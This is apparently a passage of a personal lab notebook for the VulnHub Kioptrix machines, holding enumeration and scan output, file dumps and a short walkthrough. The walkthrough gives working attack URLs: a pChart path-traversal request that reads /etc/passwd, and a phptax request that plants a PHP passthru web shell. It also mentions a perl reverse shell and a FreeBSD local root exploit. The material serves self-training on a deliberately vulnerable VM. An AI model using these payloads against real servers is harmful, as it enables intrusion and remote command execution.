/>S-1-5-21-2529228035-991147148-3991031631-1029 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1030 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1031 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1032 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1033 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1034 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1035 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1036 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1037 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1038 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1039 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1040 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1041 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1042 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1043 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1044 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1045 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1046 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1047 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1048 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1049 *unknown*\*unknown* (8)<br />S-1-5-21-2529228035-991147148-3991031631-1050 *unknown*\*unknown* (8)<br />[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-5-32-500 *unknown*\*unknown* (8)<br />S-1-5-32-501 *unknown*\*unknown* (8)<br />S-1-5-32-502 *unknown*\*unknown* (8)<br />S-1-5-32-503 *unknown*\*unknown* (8)<br />S-1-5-32-504 *unknown*\*unknown* (8)<br />S-1-5-32-505 *unknown*\*unknown* (8)<br />S-1-5-32-506 *unknown*\*unknown* (8)<br />S-1-5-32-507 *unknown*\*unknown* (8)<br />S-1-5-32-508 *unknown*\*unknown* (8)<br />S-1-5-32-509 *unknown*\*unknown* (8)<br />S-1-5-32-510 *unknown*\*unknown* (8)<br />S-1-5-32-511 *unknown*\*unknown* (8)<br />S-1-5-32-512 *unknown*\*unknown* (8)<br />S-1-5-32-513 *unknown*\*unknown* (8)<br />S-1-5-32-514 *unknown*\*unknown* (8)<br />S-1-5-32-515 *unknown*\*unknown* (8)<br />S-1-5-32-516 *unknown*\*unknown* (8)<br />S-1-5-32-517 *unknown*\*unknown* (8)<br />S-1-5-32-518 *unknown*\*unknown* (8)<br />S-1-5-32-519 *unknown*\*unknown* (8)<br />S-1-5-32-520 *unknown*\*unknown* (8)<br />S-1-5-32-521 *unknown*\*unknown* (8)<br />S-1-5-32-522 *unknown*\*unknown* (8)<br />S-1-5-32-523 *unknown*\*unknown* (8)<br />S-1-5-32-524 *unknown*\*unknown* (8)<br />S-1-5-32-525 *unknown*\*unknown* (8)<br />S-1-5-32-526 *unknown*\*unknown* (8)<br />S-1-5-32-527 *unknown*\*unknown* (8)<br />S-1-5-32-528 *unknown*\*unknown* (8)<br />S-1-5-32-529 *unknown*\*unknown* (8)<br />S-1-5-32-530 *unknown*\*unknown* (8)<br />S-1-5-32-531 *unknown*\*unknown* (8)<br />S-1-5-32-532 *unknown*\*unknown* (8)<br />S-1-5-32-533 *unknown*\*unknown* (8)<br />S-1-5-32-534 *unknown*\*unknown* (8)<br />S-1-5-32-535 *unknown*\*unknown* (8)<br />S-1-5-32-536 *unknown*\*unknown* (8)<br />S-1-5-32-537 *unknown*\*unknown* (8)<br />S-1-5-32-538 *unknown*\*unknown* (8)<br />S-1-5-32-539 *unknown*\*unknown* (8)<br />S-1-5-32-540 *unknown*\*unknown* (8)<br />S-1-5-32-541 *unknown*\*unknown* (8)<br />S-1-5-32-542 *unknown*\*unknown* (8)<br />S-1-5-32-543 *unknown*\*unknown* (8)<br />S-1-5-32-544 BUILTIN\Administrators (Local Group)<br />S-1-5-32-545 BUILTIN\Users (Local Group)<br />S-1-5-32-546 BUILTIN\Guests (Local Group)<br />S-1-5-32-547 BUILTIN\Power Users (Local Group)<br />S-1-5-32-548 BUILTIN\Account Operators (Local Group)<br />S-1-5-32-549 BUILTIN\Server Operators (Local Group)<br />S-1-5-32-550 BUILTIN\Print Operators (Local Group)<br />S-1-5-32-1000 *unknown*\*unknown* (8)<br />S-1-5-32-1001 *unknown*\*unknown* (8)<br />S-1-5-32-1002 *unknown*\*unknown* (8)<br />S-1-5-32-1003 *unknown*\*unknown* (8)<br />S-1-5-32-1004 *unknown*\*unknown* (8)<br />S-1-5-32-1005 *unknown*\*unknown* (8)<br />S-1-5-32-1006 *unknown*\*unknown* (8)<br />S-1-5-32-1007 *unknown*\*unknown* (8)<br />S-1-5-32-1008 *unknown*\*unknown* (8)<br />S-1-5-32-1009 *unknown*\*unknown* (8)<br />S-1-5-32-1010 *unknown*\*unknown* (8)<br />S-1-5-32-1011 *unknown*\*unknown* (8)<br />S-1-5-32-1012 *unknown*\*unknown* (8)<br />S-1-5-32-1013 *unknown*\*unknown* (8)<br />S-1-5-32-1014 *unknown*\*unknown* (8)<br />S-1-5-32-1015 *unknown*\*unknown* (8)<br />S-1-5-32-1016 *unknown*\*unknown* (8)<br />S-1-5-32-1017 *unknown*\*unknown* (8)<br />S-1-5-32-1018 *unknown*\*unknown* (8)<br />S-1-5-32-1019 *unknown*\*unknown* (8)<br />S-1-5-32-1020 *unknown*\*unknown* (8)<br />S-1-5-32-1021 *unknown*\*unknown* (8)<br />S-1-5-32-1022 *unknown*\*unknown* (8)<br />S-1-5-32-1023 *unknown*\*unknown* (8)<br />S-1-5-32-1024 *unknown*\*unknown* (8)<br />S-1-5-32-1025 *unknown*\*unknown* (8)<br />S-1-5-32-1026 *unknown*\*unknown* (8)<br />S-1-5-32-1027 *unknown*\*unknown* (8)<br />S-1-5-32-1028 *unknown*\*unknown* (8)<br />S-1-5-32-1029 *unknown*\*unknown* (8)<br />S-1-5-32-1030 *unknown*\*unknown* (8)<br />S-1-5-32-1031 *unknown*\*unknown* (8)<br />S-1-5-32-1032 *unknown*\*unknown* (8)<br />S-1-5-32-1033 *unknown*\*unknown* (8)<br />S-1-5-32-1034 *unknown*\*unknown* (8)<br />S-1-5-32-1035 *unknown*\*unknown* (8)<br />S-1-5-32-1036 *unknown*\*unknown* (8)<br />S-1-5-32-1037 *unknown*\*unknown* (8)<br />S-1-5-32-1038 *unknown*\*unknown* (8)<br />S-1-5-32-1039 *unknown*\*unknown* (8)<br />S-1-5-32-1040 *unknown*\*unknown* (8)<br />S-1-5-32-1041 *unknown*\*unknown* (8)<br />S-1-5-32-1042 *unknown*\*unknown* (8)<br />S-1-5-32-1043 *unknown*\*unknown* (8)<br />S-1-5-32-1044 *unknown*\*unknown* (8)<br />S-1-5-32-1045 *unknown*\*unknown* (8)<br />S-1-5-32-1046 *unknown*\*unknown* (8)<br />S-1-5-32-1047 *unknown*\*unknown* (8)<br />S-1-5-32-1048 *unknown*\*unknown* (8)<br />S-1-5-32-1049 *unknown*\*unknown* (8)<br />S-1-5-32-1050 *unknown*\*unknown* (8)<br />[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;<br />S-1-22-1-1000 Unix User\loneferret (Local User)<br />S-1-22-1-1001 Unix User\john (Local User)<br />S-1-22-1-1002 Unix User\robert (Local User)<br /><br /> ============================================= <br />|    Getting printer info for 192.168.11.8    |<br /> ============================================= <br />No printers returned.<br /><br /><br />enum4linux complete on Mon Nov 11 16:53:14 2019<br /></div><div class='page'><h1 class='title level-5'>rooted</h1><br/>john@Kioptrix4:/root$ cat congrats.txt <br />Congratulations!<br />You&#39;ve got root.<br /><br />There is more then one way to get root on this system. Try and find them.<br />I&#39;ve only tested two (2) methods, but it doesn&#39;t mean there aren&#39;t more.<br />As always there&#39;s an easy way, and a not so easy way to pop this box.<br />Look for other methods to get root privileges other than running an exploit.<br /><br />It took a while to make this. For one it&#39;s not as easy as it may look, and<br />also work and family life are my priorities. Hobbies are low on my list.<br />Really hope you enjoyed this one.<br /><br />If you haven&#39;t already, check out the other VMs available on:<br /><a href="http://www.kioptrix.com">www.kioptrix.com</a><br /><br />Thanks for playing,<br />loneferret<br /><br /></div><div class='page'><h1 class='title level-4'>kioptrix 2014</h1><br/>normal nmap and found 22,80,8080<br />kicked off TireFire for 80 and 8080<br />few results and no web app. <br />8080 was forbidden<br />80 I could only see the main page saying that it works.<br />In the page source I could see pChart2.1.3.<br />searchsploit showed me a LFI dir<br /><a href="http://192.168.11.138/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd">http://192.168.11.138/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a><br />from here I tried my list of lfi files of interest and found /usr/local/etc/apache22/httpd.conf<br />at the bottom of this conf page it said that 8080 would deny any user-agent other than Mozilla/4.0<br />So I fired up RESTer and looked at the main pagkeotrix 2014e with the custom user agent and it worked!<br />I could see that it was running phptax.<br />searchsploit showed me a LFI for remote code execution<br />http://192.168.11.138:8080/phptax/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E<br /><a href="http://192.168.11.138:8080/phptax/data/rce.php?cmd=id">http://192.168.11.138:8080/phptax/data/rce.php?cmd=id</a><br />when I saw that I could run commands I tried to get a reverse shell.<br />nc, python, and php would not work, but perl DID!<br />^^^BTW all of these commands needed to be urlencoded<br />now that I have a shell I went to /etc/shells and used /bin/tcsh<br />fixed with python<br />uname -a showed that it was running freebsd 9.0<br />searchsploit showed me that there was an exploit specifically for this.<br />scp 26368.c over and then gcc 26368.c<br />run the new file and rooted!!<br /><br /><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u <a href="http://192.168.11.138:8080/_W0QQlotrZ1QQsasuperfeaturedZ1QQsocmdZListingItemListQQsocolumnlayoutZ1QQsocustoverrideZ1.php?FUZZ=/etc/passwd/">http://192.168.11.138:8080/_W0QQlotrZ1QQsasuperfeaturedZ1QQsocmdZListingItemListQQsocolumnlayoutZ1QQsocustoverrideZ1.php?FUZZ=/etc/passwd/</a><br /><br /><a href="http://192.168.11.138/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd">http://192.168.11.138/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</a>  &lt;&lt;&lt;found via searchsploit pchart2.1.3<br /><br /><br />http://192.168.11.138:8080/phptax/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E<br /><a href="http://192.168.11.138:8080/phptax/data/rce.php?cmd=id">http://192.168.11.138:8080/phptax/data/rce.php?cmd=id</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Kioptrix# nmap -sC -sV -p- -oN kioptrix.txt 192.168.11.138<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-11 16:21 EDT<br />Nmap scan report for dc-2 (192.168.11.138)<br />Host is up (0.00032s latency).<br />Not shown: 65532 filtered ports<br />PORT     STATE  SERVICE VERSION<br />22/tcp   closed ssh<br />80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)<br />8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)<br />MAC Address: 00:0C:29:AE:CD:8D (VMware)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 131.37 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-11_16-24-48.log<br /><br />Target: http://192.168.11.138:80<br /><br />[16:24:51] Starting: <br />[16:24:51] 403 -  210B  - /cgi-bin/  <br />CTRL+C detected: Pausing threads, please wait...                    <br />65.56% - Errors: 14 - Last request to: VMware.php<br /><br /></div><div class='page'><h1 class='title level-7'>8080</h1><br/>(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-11_16-24-48.log<br /><br />Target: http://192.168.11.138:8080<br /><br />[16:24:49] Starting: <br />[16:35:32] 403 -  257B  - /OWASPBuildingSecureWebApplicationsAndWebServices-V1.php<br />[16:35:32] 403 -  254B  - /OWASPBuildingSecureWebApplicationsAndWebServices-V1/<br />[16:37:05] 403 -  248B  - /DisablingSystemSpeakerOutputfromVirtualServer/<br />[16:49:16] 403 -  295B  - /_W0QQlotrZ1QQsasuperfeaturedZ1QQsocmdZListingItemListQQsocolumnlayoutZ1QQsocustoverrideZ1.php<br />[16:49:16] 403 -  292B  - /_W0QQlotrZ1QQsasuperfeaturedZ1QQsocmdZListingItemListQQsocolumnlayoutZ1QQsocustoverrideZ1/<br />[16:49:16] 403 -  247B  - /_W0QQfclZ3QQfcoZ1QQsocmdZListingCategoryList/<br />[16:51:36] 403 -  261B  - /Email-NetworkSecurityArticlesAndHackingPreventionResources/<br />[16:51:36] 403 -  264B  - /Email-NetworkSecurityArticlesAndHackingPreventionResources.php<br />[16:51:36] 403 -  258B  - /NetworkSecurityArticlesAndHackingPreventionResources.php<br />[16:51:36] 403 -  255B  - /NetworkSecurityArticlesAndHackingPreventionResources/<br />[16:52:11] 403 -  252B  - /DonaldPipkinsSecurityTipsfortheWeekofDecember23rd/<br />[16:52:11] 403 -  247B  - /THELATESTINDENIALOFSERVICEATTACKSSMURFING.php<br />[16:52:11] 403 -  244B  - /THELATESTINDENIALOFSERVICEATTACKSSMURFING/<br />[16:52:11] 403 -  254B  - /Thedangersofftpconversionsonmisconfiguredsystems.php<br />[16:52:12] 403 -  251B  - /Thedangersofftpconversionsonmisconfiguredsystems/<br />[16:52:12] 403 -  261B  - /HowToEliminateTheTenMostCriticalInternetSecurityThreats.php<br />[16:52:12] 403 -  258B  - /HowToEliminateTheTenMostCriticalInternetSecurityThreats/<br />[16:52:13] 403 -  256B  - /ProtectionoftheAdministratorAccountintheOfflineSAM.php<br />[16:52:14] 403 -  252B  - /ImprovingtheSecurityofYourSitebyBreakingIntoit.php<br />[16:52:14] 403 -  250B  - /SQLInjectionModesofAttackDefenceandWhyItMatters/<br />[16:52:14] 403 -  263B  - /Databasesecurityprotectingsensitiveandcriticalinformation.php<br />[16:52:14] 403 -  260B  - /Databasesecurityprotectingsensitiveandcriticalinformation/<br />[16:53:27] 403 -  249B  - /fid3D64E21C0E09F5D6216C4E4B1BB933AA6C6A9EB4.php <br />[16:53:27] 403 -  246B  - /fid3D64E21C0E09F5D6216C4E4B1BB933AA6C6A9EB4/<br />[16:53:27] 403 -  249B  - /fidC329AB67BE0B054B01C120F39045E770776E6329.php<br />[16:53:27] 403 -  246B  - /fidC329AB67BE0B054B01C120F39045E770776E6329/<br />[16:53:27] 403 -  249B  - /fidB2F0CA06F287B6F3E9F56E7FEBF9CEFB3838B618.php<br />[16:53:27] 403 -  246B  - /fidB2F0CA06F287B6F3E9F56E7FEBF9CEFB3838B618/<br />[16:53:28] 403 -  249B  - /fid2D0FF5DC055234955B14BCE98AEFC6255AD6BDE3.php<br />[16:53:28] 403 -  246B  - /fid2D0FF5DC055234955B14BCE98AEFC6255AD6BDE3/<br />[16:53:28] 403 -  249B  - /fid4CADF469919DF9D577A0D8977961DAE6E57A3C25.php<br />[16:53:28] 403 -  253B  - /ProtectionoftheAdministratorAccountintheOfflineSAM/<br />[16:53:28] 403 -  249B  - /fid1ADF3F9F3A9C01CD1D1C40B4108860919D2A56AC.php<br />[16:53:28] 403 -  246B  - /fid1ADF3F9F3A9C01CD1D1C40B4108860919D2A56AC/<br />[16:54:01] 403 -  246B  - /fid4CADF469919DF9D577A0D8977961DAE6E57A3C25/<br />[16:55:42] 403 -  241B  - /Ken%20middletonUCCwithSSNsonMSsosSITEpdf/                      <br />[16:56:38] 403 -  247B  - /whatdoesyourbirthdatemeanforyourlovelifequiz/                <br />[16:57:17] 403 -  255B  - /DeanosWorld-InternetMarketingMadridLifeHumourMore.php      <br />[16:57:17] 403 -  252B  - /DeanosWorld-InternetMarketingMadridLifeHumourMore/<br />[17:01:36] 403 -  258B  - /Uses%20and%20reactions%20to%20social%20accounting%20data%20-%20final.php<br />[17:01:36] 403 -  255B  - /Uses%20and%20reactions%20to%20social%20accounting%20data%20-%20final/<br />[17:01:36] 403 -  243B  - /The%20Social%20Life%20of%20Small%20Graphical%20Chats/</div><div class='page'><h1 class='title level-6'>nikto</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.138<br />+ Target Hostname:    192.168.11.138<br />+ Target Port:        80<br />+ Start Time:         2019-10-11 16:24:47 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<br />+ Server may leak inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 13:22:52 2014<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.<br />+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br />+ PHP/5.3.8 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.<br />+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can&#39;t connect (timeout): Operation now in progress<br />+ Scan terminated:  15 error(s) and 11 item(s) reported on remote host<br />+ End Time:           2019-10-11 16:32:08 (GMT-4) (441 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/Kioptrix# <br /><br /></div><div class='page'><h1 class='title level-7'>8080</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.138<br />+ Target Hostname:    192.168.11.138<br />+ Target Port:        8080<br />+ Start Time:         2019-10-11 16:24:48 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ All CGI directories &#39;found&#39;, use &#39;-C none&#39; to test none<br />+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)<br />+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.<br />+ PHP/5.3.8 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.<br />+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can&#39;t connect (timeout): Operation now in progress<br />+ Scan terminated:  12 error(s) and 9 item(s) reported on remote host<br />+ End Time:           2019-10-11 16:31:44 (GMT-4) (416 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/Kioptrix# <br /></div><div class='page'><h1 class='title level-6'>/etc/passwd</h1><br/><code> # $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $<br />#<br />root:*:0:0:Charlie &amp;:/root:/bin/csh<br />toor:*:0:0:Bourne-again Superuser:/root:<br />daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin<br />operator:*:2:5:System &amp;:/:/usr/sbin/nologin<br />bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin<br />tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin<br />kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin<br />games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin<br />news:*:8:8:News Subsystem:/:/usr/sbin/nologin<br />man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin<br />sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin<br />smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin<br />mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin<br />bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin<br />proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin<br />_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin<br />_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin<br />uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico<br />pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin<br />www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin<br />hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin<br />nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin<br />mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin<br />ossec:*:1001:1001:User &amp;:/usr/local/ossec-hids:/sbin/nologin<br />ossecm:*:1002:1001:User &amp;:/usr/local/ossec-hids:/sbin/nologin<br />ossecr:*:1003:1001:User &amp;:/usr/local/ossec-hids:/sbin/nologin</code></div><div class='page'><h1 class='title level-6'>/usr/local/etc/apache22/httpd.conf</h1><br/><code> #<br /># This is the main Apache HTTP server configuration file.  It contains the<br /># configuration directives that give the server its instructions.<br /># See &lt;URL:http://httpd.apache.org/docs/2.2&gt; for detailed information.<br /># In particular, see <br /># &lt;URL:http://httpd.apache.org/docs/2.2/mod/directives.html&gt;<br /># for a discussion of each configuration directive.<br />#<br /># Do NOT simply read the instructions in here without understanding<br /># what they do.  They&#39;re here only as hints or reminders.  If you are unsure<br /># consult the online docs. You have been warned.  <br />#<br /># Configuration and logfile names: If the filenames you specify for many<br /># of the server&#39;s control files begin with &quot;/&quot; (or &quot;drive:/&quot; for Win32), the<br /># server will use that explicit path.  If the filenames do *not* begin<br /># with &quot;/&quot;, the value of ServerRoot is prepended -- so &quot;/var/log/foo_log&quot;<br /># with ServerRoot set to &quot;/usr/local&quot; will be interpreted by the<br /># server as &quot;/usr/local//var/log/foo_log&quot;.<br /><br />#<br /># ServerRoot: The top of the directory tree under which the server&#39;s<br /># configuration, error, and log files are kept.<br />#<br /># Do not add a slash at the end of the directory path.  If you point<br /># ServerRoot at a non-local disk, be sure to point the LockFile directive<br /># at a local disk.  If you wish to share the same ServerRoot for multiple<br /># httpd daemons, you will need to change at least LockFile and PidFile.<br />#<br />ServerRoot &quot;/usr/local&quot;<br /><br />#<br /># Listen: Allows you to bind Apache to specific IP addresses and/or<br /># ports, instead of the default. See also the &lt;VirtualHost&gt;<br /># directive.<br />#<br /># Change this to Listen on specific IP addresses as shown below to <br /># prevent Apache from glomming onto all bound IP addresses.<br />#<br />#Listen 12.34.56.78:80<br />Listen 80<br />Listen 8080<br />#<br /># Dynamic Shared Object (DSO) Support<br />#<br /># To be able to use the functionality of a module which was built as a DSO you<br /># have to place corresponding `LoadModule&#39; lines at this location so the<br /># directives contained in it are actually available _before_ they are used.<br /># Statically compiled modules (those listed by `httpd -l&#39;) do not need<br /># to be loaded here.<br />#<br /># Example:<br /># LoadModule foo_module modules/mod_foo.so<br />#<br />LoadModule authn_file_module libexec/apache22/mod_authn_file.so<br />LoadModule authn_dbm_module libexec/apache22/mod_authn_dbm.so<br />LoadModule authn_anon_module libexec/apache22/mod_authn_anon.so<br />LoadModule authn_default_module libexec/apache22/mod_authn_default.so<br />LoadModule authn_alias_module libexec/apache22/mod_authn_alias.so<br />LoadModule authz_host_module libexec/apache22/mod_authz_host.so<br />LoadModule authz_groupfile_module libexec/apache22/mod_authz_groupfile.so<br />LoadModule authz_user_module libexec/apache22/mod_authz_user.so<br />LoadModule authz_dbm_module libexec/apache22/mod_authz_dbm.so<br />LoadModule authz_owner_module libexec/apache22/mod_authz_owner.so<br />LoadModule authz_default_module libexec/apache22/mod_authz_default.so<br />LoadModule auth_basic_module libexec/apache22/mod_auth_basic.so<br />LoadModule auth_digest_module libexec/apache22/mod_auth_digest.so<br />LoadModule file_cache_module libexec/apache22/mod_file_cache.so<br />LoadModule cache_module libexec/apache22/mod_cache.so<br />LoadModule disk_cache_module libexec/apache22/mod_disk_cache.so<br />LoadModule dumpio_module libexec/apache22/mod_dumpio.so<br />LoadModule reqtimeout_module libexec/apache22/mod_reqtimeout.so<br />LoadModule include_module libexec/apache22/mod_include.so<br />LoadModule filter_module libexec/apache22/mod_filter.so<br />LoadModule charset_lite_module libexec/apache22/mod_charset_lite.so<br />LoadModule deflate_module libexec/apache22/mod_deflate.so<br />LoadModule log_config_module libexec/apache22/mod_log_config.so<br />LoadModule logio_module libexec/apache22/mod_logio.so<br />LoadModule env_module libexec/apache22/mod_env.so<br />LoadModule mime_magic_module libexec/apache22/mod_mime_magic.so<br />LoadModule cern_meta_module libexec/apache22/mod_cern_meta.so<br />LoadModule expires_module libexec/apache22/mod_expires.so<br />LoadModule headers_module libexec/apache22/mod_headers.so<br />LoadModule usertrack_module libexec/apache22/mod_usertrack.so<br />LoadModule unique_id_module libexec/apache22/mod_unique_id.so<br />LoadModule setenvif_module libexec/apache22/mod_setenvif.so<br />LoadModule version_module libexec/apache22/mod_version.so<br />LoadModule ssl_module libexec/apache22/mod_ssl.so<br />LoadModule mime_module libexec/apache22/mod_mime.so<br />LoadModule dav_module libexec/apache22/mod_dav.so<br />LoadModule status_module libexec/apache22/mod_status.so<br />LoadModule autoindex_module libexec/apache22/mod_autoindex.so<br />LoadModule asis_module libexec/apache22/mod_asis.so<br />LoadModule info_module libexec/apache22/mod_info.so<br />LoadModule cgi_module libexec/apache22/mod_cgi.so<br />LoadModule dav_fs_module libexec/apache22/mod_dav_fs.so<br />LoadModule vhost_alias_module libexec/apache22/mod_vhost_alias.so<br />LoadModule negotiation_module libexec/apache22/mod_negotiation.so<br />LoadModule dir_module libexec/apache22/mod_dir.so<br />LoadModule imagemap_module libexec/apache22/mod_imagemap.so<br />LoadModule actions_module libexec/apache22/mod_actions.so<br />LoadModule speling_module libexec/apache22/mod_speling.so<br />LoadModule userdir_module libexec/apache22/mod_userdir.so<br />LoadModule alias_module libexec/apache22/mod_alias.so<br />LoadModule rewrite_module libexec/apache22/mod_rewrite.so<br />LoadModule php5_module        libexec/apache22/libphp5.so<br /><br />&lt;IfModule !mpm_netware_module&gt;<br />&lt;IfModule !mpm_winnt_module&gt;<br />#<br /># If you wish httpd to run as a different user or group, you must run<br /># httpd as root initially and it will switch.  <br />#<br /># User/Group: The name (or #number) of the user/group to run httpd as.<br /># It is usually good practice to create a dedicated user and group for<br /># running httpd, as with most system services.<br />#<br />User www<br />Group www<br /><br />&lt;/IfModule&gt;<br />&lt;/IfModule&gt;<br /><br /># &#39;Main&#39; server configuration<br />#<br /># The directives in this section set up the values used by the &#39;main&#39;<br /># server, which responds to any requests that aren&#39;t handled by a<br /># &lt;VirtualHost&gt; definition.  These values also provide defaults for<br /># any &lt;VirtualHost&gt; containers you may define later in the file.<br />#<br /># All of these directives may appear inside &lt;VirtualHost&gt; containers,<br /># in which case these default settings will be overridden for the<br /># virtual host being defined.<br />#<br /><br />#<br /># ServerAdmin: Your address, where problems with the 